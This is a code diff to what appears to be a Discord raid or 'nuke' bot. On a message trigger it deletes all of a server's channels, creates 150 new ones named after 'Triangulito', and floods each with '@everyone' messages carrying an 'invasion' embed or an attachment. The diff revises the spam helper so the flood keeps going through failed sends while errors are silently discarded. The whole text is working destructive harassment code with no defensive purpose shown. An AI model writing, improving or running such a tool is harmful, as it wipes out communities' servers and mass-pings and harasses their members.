@@ -90,11 +90,17 @@ async function createChannels(guild, name, count, batchSize = 10) {
   return created;
 }
 
-// Helper: spam messages in all channels in parallel
+// Helper: spam messages in all channels in parallel with retry logic
 async function spamChannels(channels, msgCount, buildMsg) {
   await Promise.all(channels.map(async (channel) => {
-    const sends = Array.from({ length: msgCount }, () => channel.send(buildMsg()).catch(() => {}));
-    await Promise.all(sends);
+    if (!channel) return;
+    for (let i = 0; i < msgCount; i++) {
+      try {
+        await channel.send(buildMsg());
+      } catch (err) {
+        // Silently fail on individual message sends
+      }
+    }
   }));
 }
 
@@ -131,7 +137,7 @@ client.on('messageCreate', async message => {
     // 1. Delete + Create channels in parallel batches
     await deleteAllChannels(guild);
     const created = await createChannels(guild, 'TRIANGULITO THE GOAT', 150, 10);
-    // 2. Spam all channels in parallel, all 20 messages per channel in parallel
+    // 2. Spam all channels in parallel, all 20 messages per channel
     await spamChannels(created, 20, () => ({ content: '@everyone', embeds: [invasionEmbed] }));
     // 3. Server changes in parallel
     await Promise.all([
@@ -191,7 +197,7 @@ client.on('messageCreate', async message => {
     // 1. Delete + Create in parallel batches
     await deleteAllChannels(guild);
     const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
-    // 2. Spam all 10 messages per channel fully in parallel
+    // 2. Spam all 10 messages per channel with attachment
     if (triangulitoBuffer) {
       await spamChannels(created, 10, () => ({
         content: '@everyone',
